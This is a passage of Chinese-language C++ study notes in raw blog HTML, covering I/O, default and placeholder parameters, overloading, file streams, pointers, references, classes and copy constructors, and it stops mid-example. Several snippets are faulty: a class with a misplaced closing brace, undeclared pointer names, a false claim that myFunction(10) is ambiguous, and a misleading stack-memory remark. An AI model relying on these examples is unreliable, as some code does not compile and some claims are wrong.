class="line">str = a + b;</span><br><span class="line">str.<span class="built_in">append</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得长度（注：类型是无符号类型，需要做运算前应该赋给int类型的变量，再做运算）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取float和double所有精度</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">float</span> f = <span class="number">123.45678901234567894567890123456789f</span>;</span><br><span class="line">    <span class="comment">// std::setprecision(7)：设置精度</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;float: &quot;</span> &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">7</span>) &lt;&lt; f &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> d = <span class="number">123.45678901234567894567890123456789</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;double: &quot;</span> &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">16</span>) &lt;&lt; d &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3 运算符"></a>3 运算符</h3><blockquote><p>同C。</p></blockquote><h3 id="4-输入输出"><a href="#4-输入输出" class="headerlink" title="4 输入输出"></a>4 输入输出</h3><blockquote><p><a href="https://blog.csdn.net/weixin_41042404/article/details/80934191">输入带空格</a></p><p><a href="https://blog.csdn.net/u013594490/article/details/92779827">输入被跳过问题</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入（同C：空格截断）</span></span><br><span class="line">cin &gt;&gt; (scanf) ; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// (print)是输出结果，例：cout &lt;&lt; &quot;a=&quot;&lt;&lt; a &lt;&lt; &quot;,b=&quot; &lt;&lt; b &lt;&lt; endl; </span></span><br><span class="line"><span class="comment">// endl：以换行结束，ends：不以换行结束。</span></span><br><span class="line">cout &lt;&lt; (print) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="string">&quot;World&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//带空格输入（string中前一个函数是将cin的残留回车符清除。）</span></span><br><span class="line"><span class="type">char</span>[]带空格：cin.<span class="built_in">get</span>(arr,len);</span><br><span class="line">string带空格：cin.<span class="built_in">ignore</span>(); <span class="built_in">getline</span>(cin,str);  </span><br></pre></td></tr></table></figure><h3 id="5-判断"><a href="#5-判断" class="headerlink" title="5 判断"></a>5 判断</h3><blockquote><p>同C。</p></blockquote><h3 id="6-循环"><a href="#6-循环" class="headerlink" title="6 循环"></a>6 循环</h3><blockquote><p>同C。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//goto语句（同汇编）：</span></span><br><span class="line">label: </span><br><span class="line"><span class="keyword">goto</span> label;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代获得str中的值给x，带了引用表示对x的操作会影响str值，不带则不会影响</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x:str);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; x:str);</span><br></pre></td></tr></table></figure><h3 id="7-数组"><a href="#7-数组" class="headerlink" title="7 数组"></a>7 数组</h3><blockquote><p>同C。</p></blockquote><h3 id="8-函数"><a href="#8-函数" class="headerlink" title="8 函数"></a>8 函数</h3><blockquote><p>同C。</p><ul><li>默认参数<ol><li>不同于python，默认参数之后的参数都必须是默认参数，输入值时不可以指定参数的位置（例不可以：<code>fun( b = 10);</code> ）</li><li>函数在声明和实现中只能有一处有默认参数。</li></ol></li><li>占位参数<ol><li>传值时必须传值，但是该值不会被使用（暂时）（例：<code>void fun ( int a , int )</code>）</li><li>占位参数也可以是默认参数（例：<code>void fun ( int a , int  = 10 )</code>）</li></ol></li><li>函数重载<ol><li>参数是( int&amp; a) 和 ( const int&amp; a )：func(a)是第一个，func(10)是第二个。</li><li>默认参数容易出现二义性。</li></ol></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认参数</span></span><br><span class="line"><span class="comment">// 示例1：默认参数之后的参数都必须是默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">5</span>, <span class="type">int</span> c = <span class="number">10</span>)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">1</span>); <span class="comment">// 正确，b和c将使用默认值</span></span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 正确，c将使用默认值</span></span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">1</span>, c = <span class="number">15</span>); <span class="comment">// 错误，不可以指定参数的位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2：函数声明中指定默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">5</span>)</span></span>; </span><br><span class="line"><span class="comment">// 函数定义中不能再次指定默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 占位参数</span></span><br><span class="line"><span class="comment">// 示例1：带有占位参数的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// a被使用，但第二个参数没有使用</span></span><br><span class="line">    <span class="comment">// 所以传递什么值给第二个参数并不重要</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">5</span>, <span class="number">10</span>); <span class="comment">// 参数10会被忽略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2：占位参数也可以是默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span> </span>&#123;&#125;</span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">5</span>); <span class="comment">// 正确，b将使用默认值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数重载</span></span><br><span class="line"><span class="comment">// 示例1：参数是(int&amp; a) 和 (const int&amp; a)</span></span><br><span class="line"><span class="comment">// a是一个非常量引用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span>&amp; a)</span> </span>&#123;&#125;</span><br><span class="line"><span class="comment">// a是一个常量引用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; a)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">myFunction</span>(x); <span class="comment">// 调用第一个函数，x是一个非常量</span></span><br><span class="line">    <span class="built_in">myFunction</span>(y); <span class="comment">// 调用第二个函数，y是一个常量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">myFunction</span>(<span class="number">10</span>); <span class="comment">// 错误，编译器无法确定调用哪个函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2：默认参数容易出现二义性</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">5</span>)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;&#125;</span><br><span class="line"><span class="built_in">myFunction</span>(<span class="number">1</span>); <span class="comment">// 错误，出现了默认参数的二义性</span></span><br></pre></td></tr></table></figure><h3 id="9-文件"><a href="#9-文件" class="headerlink" title="9 文件"></a>9 文件</h3><div class="table-container"><table><thead><tr><th>流对象</th><th>作用</th></tr></thead><tbody><tr><td>ofstream</td><td>写文件</td></tr><tr><td>ifstream</td><td>读文件</td></tr><tr><td>fstream</td><td>读写文件</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>打开方式</th><th>解释</th></tr></thead><tbody><tr><td>ios::in</td><td>读</td></tr><tr><td>ios::out</td><td>写</td></tr><tr><td>ios::ate</td><td>初始位置为文件尾</td></tr><tr><td>ios::app</td><td>追加</td></tr><tr><td>ios::trunc</td><td>文件存在则删除文件再创建</td></tr><tr><td>ios::binary</td><td>二进制打开</td></tr></tbody></table></div><blockquote><p>文件打开方式可以配合使用，如二进制写：<code>ios::binary | ios::out</code></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.创建流对象</span></span><br><span class="line">ifstream ifs;</span><br><span class="line"><span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;path&quot;</span>,mode)</span></span>;</span><br><span class="line">ofstream ofs;</span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;path&quot;</span>,mode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.打开文件（也可以直接在上面构造对象）</span></span><br><span class="line">ofs.<span class="built_in">open</span>(<span class="string">&quot;path&quot;</span>,mode);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.读写数据</span></span><br><span class="line">ifs &gt;&gt; buf;</span><br><span class="line">ofs &lt;&lt; <span class="string">&quot;data&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.关闭文件</span></span><br><span class="line">ofs.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读数据</span></span><br><span class="line">ifs.<span class="built_in">read</span>(buf,<span class="built_in">sizeof</span>(buf));</span><br><span class="line"><span class="comment">// 读取一行</span></span><br><span class="line">ifs.<span class="built_in">getline</span>(buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">getline</span>(ifs,buf);</span><br><span class="line"><span class="comment">// 读取一个字符</span></span><br><span class="line"><span class="type">char</span> c = ifs.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写数据</span></span><br><span class="line">ofs.<span class="built_in">write</span>(buf,<span class="built_in">sizeof</span>(buf));</span><br></pre></td></tr></table></figure><h3 id="10-异常"><a href="#10-异常" class="headerlink" title="10 异常"></a>10 异常</h3><blockquote><p><a href="https://blog.csdn.net/wohu1104/article/details/108188965">链接</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="string">&quot;tip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获异常</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="built_in">catch</span>(ExceptionName e)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="comment">// 写...表示捕获所有异常</span></span><br><span class="line"><span class="built_in">catch</span>(...)</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="11-指针"><a href="#11-指针" class="headerlink" title="11 指针"></a>11 指针</h3><blockquote><p>同C</p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常量指针：指针的指向可以改，指针指向的值不能被修改。</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* p = &amp;a;</span><br><span class="line">p1 = &amp;b; <span class="comment">// 正确</span></span><br><span class="line">*p1 = <span class="number">100</span>;  <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针常量：指针的指向不可以改，指针指向的值可以改。</span></span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> p = &amp;a;</span><br><span class="line">p2 = &amp;b; <span class="comment">// 报错</span></span><br><span class="line">*p2 = <span class="number">100</span>; <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const既修饰指针又修饰常量：都不可以改。</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> p = &amp;a;</span><br><span class="line">p3 = &amp;b; <span class="comment">// 报错</span></span><br><span class="line">*p3 = <span class="number">100</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><h3 id="12-结构体"><a href="#12-结构体" class="headerlink" title="12 结构体"></a>12 结构体</h3><blockquote><p>同C</p><p>默认访问权限是公有。</p></blockquote><h3 id="13-内存"><a href="#13-内存" class="headerlink" title="13 内存"></a>13 内存</h3><blockquote><p>同C</p></blockquote><div class="table-container"><table><thead><tr><th>内存区域</th><th>解释</th></tr></thead><tbody><tr><td>代码区</td><td>存放函数体的二进制代码，由操作系统进行管理</td></tr><tr><td>全局区</td><td>存放全局变量 全局常量和静态变量</td></tr><tr><td>栈区</td><td>由编译器自动分配释放，存放函数的参数值，局部变量，局部常量等（栈区函数使用完后返回的局部变量会保留一次，cout输出一次其他字符串后会被清空）</td></tr><tr><td>堆区</td><td>由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收</td></tr></tbody></table></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆区开辟数据：（指针在栈区，数据在堆区）</span></span><br><span class="line"><span class="comment">//开辟地址，初值为 num</span></span><br><span class="line">type *p = <span class="keyword">new</span> <span class="built_in">type</span>( num ) ;</span><br><span class="line"><span class="comment">//num 个 type 的地址</span></span><br><span class="line">type *p = <span class="keyword">new</span> type[ num ] ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//堆区释放数据/数组</span></span><br><span class="line"><span class="keyword">delete</span> p; </span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure><hr><h2 id="三、-引用"><a href="#三、-引用" class="headerlink" title="三、 引用"></a>三、 引用</h2><blockquote><p>注意：</p><ul><li>引用必须初始化，不能只有定义。（作为函数参数可以补初始化）</li><li>引用初始化后不能再修改指向对象，之后使用等于是赋值。（包括地址指向）</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">type &amp;alias = name;</span><br><span class="line"><span class="type">int</span>&amp; b = a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部实现：指针常量（下面两个等价）</span></span><br><span class="line"><span class="type">int</span>&amp; ref = a;  <span class="comment">// ref = a;和下面注释等价</span></span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> ref = &amp;a;  <span class="comment">// *ref = a;</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数引用传递（传原名，相当于取别名后传递，会影响原数据）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span> <span class="params">(<span class="type">int</span>&amp; a,<span class="type">int</span>&amp; b)</span></span>;</span><br><span class="line"><span class="comment">//返回值可以是引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有趣案例：</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span>&amp; ref = <span class="built_in">fun</span>();</span><br><span class="line">    <span class="built_in">fun</span>() = <span class="number">1000</span>;</span><br><span class="line">    std::cout &lt;&lt; ref &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印值为1000。</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、-类与对象"><a href="#四、-类与对象" class="headerlink" title="四、 类与对象"></a>四、 类与对象</h2><h3 id="1-封装"><a href="#1-封装" class="headerlink" title="1 封装"></a>1 封装</h3><blockquote><p><code>class name &#123; access : type / function &#125;;</code> ： class 类名 { 访问权限 : 属性 / 方法 } ;（不用于C#，一个访问权限会影响后面所有的属性和方法）</p><p><code>class_name::function</code>：class_name.function，直接使用类的方法，不实例化。</p><p>类的拆分：</p><ul><li>头文件：保留类名和函数名。</li><li>主文件：类的具体实现。（不用留下类名，而是在包含头文件后 class_name : : function 即可，相当于直接用类的属性或方法）</li></ul><p>访问权限：（类内属性方法默认私有，结构体内属性方法默认公有）</p><ul><li>public：类内可以访问，类外可以访问。</li><li>private：类内可以访问，类外不可以访问。不可以被继承。</li><li>protected：类内可以访问，类外不可以访问。可以被继承。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">int</span> high = <span class="number">160</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 类中可以定义引用类型</span></span><br><span class="line"><span class="type">int</span>&amp; age = high;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(string n, <span class="type">int</span> a) &#123;</span><br><span class="line">        name = n;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公有方法</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">say_hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Hello, my name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; and I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公有方法</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">set_age</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公有方法</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get_age</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 Person 类的对象</span></span><br><span class="line">    <span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用公有方法</span></span><br><span class="line">    p.<span class="built_in">say_hello</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用公有方法</span></span><br><span class="line">    p.<span class="built_in">set_age</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用公有方法</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Bob&#x27;s age is &quot;</span> &lt;&lt; p.<span class="built_in">get_age</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-对象特征"><a href="#2-对象特征" class="headerlink" title="2 对象特征"></a>2 对象特征</h3><h4 id="2-1-构造和析构"><a href="#2-1-构造和析构" class="headerlink" title="2.1 构造和析构"></a>2.1 构造和析构</h4><blockquote><p>构造函数：<code>class_name() &#123;&#125;</code> ，实例化对象，可以有参数。</p><p>初始化列表： <code>class_name() : type() , ... ;</code>（同C#，自动调用构造函数）</p><ul><li>初始化列表的执行顺序与成员变量在类定义中的声明顺序有关。</li><li>建议成员变量的初始化顺序应该与它们在类定义中的声明顺序一致，以避免潜在的问题。</li></ul><p>初始化类：</p><ul><li>括号法（无参直接不写括号，不然是声明函数）</li><li>显示法（不写实例是初始化一个匿名对象，不使用会立刻被释放。且不要匿名初始化拷贝函数，编译器会认为是对象声明（Person(p3)等价于Person p3 ））</li></ul><p>析构函数：<code>~class_name() &#123;&#125;</code>，销毁对象，不可以有参数。</p><p>类嵌套，构造类先构造自身中的其他类再构造自身，析构则相反。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line"><span class="comment">// 括号法</span></span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">Person p;</span><br><span class="line"><span class="comment">// 显示法</span></span><br><span class="line">Person p = <span class="built_in">Person</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式转换</span></span><br><span class="line">Person p4 = <span class="number">10</span>; <span class="comment">// 等价于Person p4 = Person(10);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放内存</span></span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123; </span><br><span class="line">    <span class="keyword">delete</span> p; </span><br><span class="line">    p = <span class="literal">NULL</span>; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化列表（初始化顺序是先1后2，因为1先声明）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_value1;</span><br><span class="line">    <span class="type">int</span> m_value2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> value1, <span class="type">int</span> value2) : <span class="built_in">m_value1</span>(value1), <span class="built_in">m_value2</span>(value2) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Hello World&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Person constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">const</span> Person&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Person copy constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Person destructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 匿名对象，立即被释放</span></span><br><span class="line">    <span class="built_in">Person</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 匿名对象拷贝初始化，被解释为对象声明</span></span><br><span class="line">    <span class="built_in">Person</span>(p3);</span><br><span class="line">    Person p4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-拷贝类"><a href="#2-2-拷贝类" class="headerlink" title="2.2 拷贝类"></a>2.2 拷贝类</h4><blockquote><p>浅拷贝：简单的复制拷贝（指针则是复制地址）。</p><p>深拷贝：重新在堆区申请空间再进行拷贝。</p><p>类构造函数分类：有参和无参，普通和拷贝构造函数（<code>Person ( const Person &amp;p) ;</code> ，传一个自己的引用）</p><p>拷贝构造函数使用场景：</p><ol><li>函数传局部变量：当将一个对象作为参数传递给函数时，拷贝构造函数会在函数调用期间创建该对象的副本。</li><li>函数 return：当函数返回一个对象时，拷贝构造函数会在函数返回之前创建该对象的副本。</li><li>主动拷贝：有时候需要显式地创建一个对象的副本，而不是与现有对象共享数据。</li></ol><p>注意：如果用户定义了拷贝构造函数，c++不会提供任何默认构造函数。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 拷贝构造函数（浅拷贝）</span></span><br><span class="line"><span class="built_in">MyClass</span>(<span class="type">const</span> MyClass&amp; other) : <span class="built_in">m_data</span>(other.m_data) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 拷贝构造函数（深拷贝）</span></span><br><span class="line"><span class="built_in">MyClass</span>(<span class="type">const</span> MyClass&amp; other) &#123;</span><br><span class="line">m_data = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(other.m_data) + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(m_data, other.m_data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用拷贝构造函数</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj2</span><span class="params">(obj1)</span></span>;</span><br><span class="line">MyClass obj3 = obj1; <span class="comment">// 和等号赋值运算符不同，此处是声明并赋值，等于调用了拷贝构造函数</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.函数传局部变量</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">const</span> MyClass&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Copy constructor called&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doSomething</span><span class="params">(MyClass obj)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在函数调用期间，会调用拷贝构造函数来创建 obj 的副本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass obj;</span><br><span class="line">    <span class="built_in">doSomething</span>(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.函数 return</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123;</span><br><span class="line">    